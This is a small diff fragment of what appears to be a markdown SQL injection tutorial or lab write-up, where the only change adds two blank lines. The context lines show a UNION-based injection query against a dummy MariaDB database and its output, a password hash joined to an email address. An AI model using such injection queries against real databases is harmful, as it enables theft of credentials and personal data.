@@ -19,3 +19,5 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 |         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
 +-----------+-----------------------------------------------------------------+
 ```
+
+
